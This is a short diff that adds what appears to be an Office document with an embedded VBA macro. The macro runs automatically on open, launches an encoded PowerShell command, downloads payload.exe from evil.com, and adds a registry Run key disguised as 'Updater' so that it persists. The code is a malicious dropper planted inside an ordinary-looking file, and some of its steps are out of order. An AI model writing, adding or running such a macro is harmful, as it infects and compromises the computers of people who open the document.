@@ -1,0 +1,23 @@
+
+ÐÏà¡±á
+vbaProject.bin
+Sub AutoOpen()
+    Dim objShell As Object
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "cmd /c powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
+    
+    Dim http As Object
+    Set http = CreateObject("MSXML2.ServerXMLHTTP")
+    http.Open "GET", "http://evil.com/payload.exe", False
+    http.Send
+    
+    Shell "cmd.exe /c reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Updater /d payload.exe"
+    
+    Open Environ("TEMP") & "\payload.exe" For Output As #1
+    Write #1, http.responseBody
+    Close #1
+End Sub
+
+Sub Document_Open()
+    AutoOpen
+End Sub
